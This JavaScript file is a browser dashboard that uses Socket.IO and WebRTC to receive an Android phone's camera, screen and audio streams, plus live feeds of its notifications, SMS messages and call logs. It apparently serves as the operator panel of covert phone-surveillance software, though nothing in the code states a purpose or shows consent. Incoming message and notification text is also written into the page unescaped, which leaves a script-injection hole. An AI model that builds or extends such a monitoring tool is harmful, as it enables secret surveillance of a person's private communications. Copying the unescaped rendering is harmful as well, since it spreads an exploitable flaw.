const socket = io('http://192.168.29.10:3000');
const videoEl = document.getElementById('remoteVideo');
const screenEl = document.getElementById('screenVideo');
const statusDiv = document.getElementById('status');
const connectionStatus = document.getElementById('connection-status');
const cameraResolution = document.getElementById('camera-resolution');
const screenResolution = document.getElementById('screen-resolution');
const webClientIdEl = document.getElementById('web-client-id');
const androidClientIdEl = document.getElementById('android-client-id');
const frameRateEl = document.getElementById('frame-rate');
const muteAudioBtn = document.getElementById('mute-audio');
const pauseVideoBtn = document.getElementById('pause-video');
const notificationsDiv = document.getElementById('notifications');
const smsDiv = document.getElementById('sms');
const callLogsDiv = document.getElementById('call-logs');
const screenVideoContainer = document.getElementById('screen-video-container');
let peer;
let myId;
let androidClientId;
let videoTrackCount = 0;
let isAudioMuted = false;
let isVideoPaused = false;
const smsCache = new Set();
const callLogCache = new Set();

const config = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    {
      urls: 'turn:openrelay.metered.ca:80',
      username: 'openrelayproject',
      credential: 'openrelayproject'
    },
    {
      urls: 'turn:openrelay.metered.ca:443',
      username: 'openrelayproject',
      credential: 'openrelayproject'
    }
  ]
};

function updateStatus(message) {
  console.log(message);
  statusDiv.textContent = message;
}

function updateStreamDetails(track, type) {
  if (track.kind === 'video') {
    const settings = track.getSettings();
    const resolutionEl = type === 'camera' ? cameraResolution : screenResolution;
    resolutionEl.textContent = `${settings.width}x${settings.height}`;
    frameRateEl.textContent = settings.frameRate || 'N/A';
    if (type === 'screen') {
      const [width, height] = resolutionEl.textContent.split('x').map(Number);
      screenVideoContainer.style.width = `${Math.min(width, 960)}px`;
      screenVideoContainer.style.maxWidth = '100%';
      screenVideoContainer.style.height = `${Math.min(height, 540)}px`;
      screenVideoContainer.style.maxHeight = '100%';
      screenVideoContainer.style.aspectRatio = `${width} / ${height}`;
    } else if (type === 'camera') {
      const [width, height] = resolutionEl.textContent.split('x').map(Number);
      videoEl.parentElement.style.aspectRatio = `${width} / ${height}`;
    }
  }
}

socket.on('connect', () => {
  updateStatus('Connected to signaling server');
  connectionStatus.textContent = 'Connected';
});

socket.on('id', id => {
  myId = id;
  console.log('My socket ID:', myId);
  webClientIdEl.textContent = myId;
  socket.emit('identify', 'web');
  socket.emit('web-client-ready', myId);
  updateStatus('Announced readiness to receive stream');
});

socket.on('android-client-ready', id => {
  androidClientId = id;
  console.log('Android client ready:', id);
  androidClientIdEl.textContent = id;
  updateStatus('Android client connected');
});

socket.on('signal', async (data) => {
  console.log('Received signal:', JSON.stringify(data));
  const { from, signal } = data;

  if (!peer) {
    console.log('Creating new peer connection');
    peer = new RTCPeerConnection(config);
    peer.addTransceiver('video', { direction: 'recvonly' }); // Camera
    peer.addTransceiver('video', { direction: 'recvonly' }); // Screen
    peer.addTransceiver('audio', { direction: 'recvonly' });

    peer.ontrack = event => {
      console.log(`Received ${event.track.kind} track:`, {
        id: event.track.id,
        mid: event.transceiver?.mid,
        label: event.track.label,
        streamId: event.streams[0]?.id
      });
      const stream = event.streams[0];
      if (event.track.kind === 'video') {
        videoTrackCount++;
        if (videoTrackCount === 1 || event.transceiver?.mid === '0' || event.track.label.includes('video')) {
          if (!videoEl.srcObject) {
            videoEl.srcObject = stream;
            videoEl.onloadedmetadata = () => {
              console.log('Camera video metadata loaded, attempting to play');
              videoEl.play().catch(e => console.error('Camera play error:', e));
              updateStatus('Playing Android camera stream');
              document.body.style.backgroundColor = '#0f172a';
              updateStreamDetails(event.track, 'camera');
            };
          }
        } else if (videoTrackCount === 2 || event.transceiver?.mid === '2' || event.track.label.includes('screen')) {
          if (!screenEl.srcObject) {
            screenEl.srcObject = stream;
            screenEl.onloadedmetadata = () => {
              console.log('Screen video metadata loaded, attempting to play');
              screenEl.play().catch(e => console.error('Screen play error:', e));
              updateStatus('Playing Android screen stream');
              document.body.style.backgroundColor = '#0f172a';
              updateStreamDetails(event.track, 'screen');
            };
          }
        } else {
          console.warn('Unexpected video track:', {
            mid: event.transceiver?.mid,
            label: event.track.label,
            count: videoTrackCount
          });
        }
      } else if (event.track.kind === 'audio') {
        if (!videoEl.srcObject) {
          videoEl.srcObject = stream;
          console.log('Assigned audio to camera video element');
          updateStatus('Playing Android audio stream');
        }
      }
    };

    peer.onicecandidate = e => {
      if (e.candidate) {
        console.log('Sending ICE candidate:', e.candidate.sdpMid);
        socket.emit('signal', {
          to: from,
          from: myId,
          signal: { candidate: e.candidate }
        });
      }
    };

    peer.oniceconnectionstatechange = () => {
      console.log('ICE connection state:', peer.iceConnectionState);
      updateStatus(`ICE connection: ${peer.iceConnectionState}`);
      connectionStatus.textContent = peer.iceConnectionState;
      if (peer.iceConnectionState === 'failed') {
        updateStatus('Connection failed, please restart');
      }
    };

    peer.onsignalingstatechange = () => {
      console.log('Signaling state:', peer.signalingState);
    };
  }

  try {
    if (signal.type === 'offer') {
      console.log('Processing offer from Android, SDP:', signal.sdp);
      await peer.setRemoteDescription(new RTCSessionDescription(signal));
      const answer = await peer.createAnswer();
      console.log('Created answer, SDP:', answer.sdp);
      await peer.setLocalDescription(answer);
      console.log('Sending answer back to Android');
      socket.emit('signal', {
        to: from,
        from: myId,
        signal: { type: 'answer', sdp: answer.sdp }
      });
    } else if (signal.candidate) {
      console.log('Adding ICE candidate:', signal.candidate.candidate);
      await peer.addIceCandidate(new RTCIceCandidate(signal.candidate));
    }
  } catch (err) {
    console.error('Error handling signal:', err);
    updateStatus('Error: ' + err.message);
  }
});

socket.on('android-client-disconnected', () => {
  updateStatus('Android client disconnected');
  connectionStatus.textContent = 'Disconnected';
  cameraResolution.textContent = 'N/A';
  screenResolution.textContent = 'N/A';
  androidClientIdEl.textContent = 'N/A';
  frameRateEl.textContent = 'N/A';
  screenVideoContainer.style.width = '';
  screenVideoContainer.style.height = '';
  screenVideoContainer.style.aspectRatio = '16 / 9';
  if (peer) {
    peer.close();
    peer = null;
    videoEl.srcObject = null;
    screenEl.srcObject = null;
    videoTrackCount = 0;
    document.body.style.backgroundColor = '#0f172a';
  }
  notificationsDiv.innerHTML = '<p>Waiting for notifications...</p>';
  smsDiv.innerHTML = '<p>Waiting for SMS...</p>';
  callLogsDiv.innerHTML = '<p>Waiting for call logs...</p>';
  smsCache.clear();
  callLogCache.clear();
});

socket.on('connect_error', (error) => {
  console.error('Socket.IO connect error:', error);
  updateStatus('Signaling connection error');
  connectionStatus.textContent = 'Disconnected';
});

socket.on('notification', (data) => {
  console.log('Received notification:', data);
  if (notificationsDiv.querySelector('p').textContent === 'Waiting for notifications...') {
    notificationsDiv.innerHTML = '';
  }
  const notification = document.createElement('div');
  notification.className = 'data-entry';
  const appName = data.app.split('.').pop() || data.app;
  notification.innerHTML = `<p><strong>${appName}</strong>: ${data.title} - ${data.text} (${new Date(data.timestamp).toLocaleTimeString()})</p>`;
  notificationsDiv.insertBefore(notification, notificationsDiv.firstChild);
  notificationsDiv.scrollTop = 0;
});

socket.on('sms', (data) => {
  console.log('Received SMS:', data);
  const key = `${data.sender}:${data.message}:${data.timestamp}`;
  if (smsCache.has(key)) return;
  smsCache.add(key);
  if (smsDiv.querySelector('p').textContent === 'Waiting for SMS...') {
    smsDiv.innerHTML = '';
  }
  const sms = document.createElement('div');
  sms.className = 'data-entry';
  sms.innerHTML = `<p><strong>${data.sender}</strong>: ${data.message} (${new Date(data.timestamp).toLocaleTimeString()})</p>`;
  smsDiv.insertBefore(sms, smsDiv.firstChild);
  smsDiv.scrollTop = 0;
});

socket.on('call-log', (data) => {
  console.log('Received call log:', data);
  const key = `${data.number}:${data.type}:${data.timestamp}`;
  if (callLogCache.has(key)) return;
  callLogCache.add(key);
  if (callLogsDiv.querySelector('p').textContent === 'Waiting for call logs...') {
    callLogsDiv.innerHTML = '';
  }
  const call = document.createElement('div');
  call.className = 'data-entry';
  call.innerHTML = `<p><strong>${data.number}</strong> (${data.type}): ${new Date(data.timestamp).toLocaleTimeString()}</p>`;
  callLogsDiv.insertBefore(call, callLogsDiv.firstChild);
  callLogsDiv.scrollTop = 0;
});

muteAudioBtn.addEventListener('click', () => {
  if (peer && videoEl.srcObject) {
    const audioTrack = videoEl.srcObject.getAudioTracks()[0];
    if (audioTrack) {
      isAudioMuted = !isAudioMuted;
      audioTrack.enabled = !isAudioMuted;
      muteAudioBtn.textContent = isAudioMuted ? 'Unmute Audio' : 'Mute Audio';
      updateStatus(isAudioMuted ? 'Audio muted' : 'Audio unmuted');
    }
  }
});

pauseVideoBtn.addEventListener('click', () => {
  if (peer && (videoEl.srcObject || screenEl.srcObject)) {
    isVideoPaused = !isVideoPaused;
    const videoTracks = [
      ...(videoEl.srcObject?.getVideoTracks() || []),
      ...(screenEl.srcObject?.getVideoTracks() || [])
    ];
    videoTracks.forEach(track => (track.enabled = !isVideoPaused));
    pauseVideoBtn.textContent = isVideoPaused ? 'Resume Video' : 'Pause Video';
    updateStatus(isVideoPaused ? 'Video paused' : 'Video resumed');
  }
});

updateStatus('Waiting for Android stream...');
console.log('Web client ready for incoming stream');